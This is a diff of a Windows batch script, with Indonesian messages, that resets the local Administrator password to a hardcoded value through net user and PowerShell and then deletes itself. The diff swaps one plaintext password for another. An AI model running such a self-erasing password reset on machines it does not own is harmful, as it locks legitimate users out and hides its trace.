@@ -2,7 +2,7 @@
 mode con cp select=437 >nul
 setlocal enabledelayedexpansion
 set USERNAME=Administrator
-set NEWPASS=baritosquad@17
+set NEWPASS=vivaaku@828
 
 net user %USERNAME% %NEWPASS%
 powershell -NoProfile -Command "Try { net user '%USERNAME%' '%NEWPASS%'; Write-Host 'Password lokal berhasil diganti.' } Catch { Write-Host 'Gagal mengganti password lokal.' }"
@@ -28,6 +28,7 @@ for %%i in (1 2) do (
 )
 
 del "%~f0"
+
 
 
 
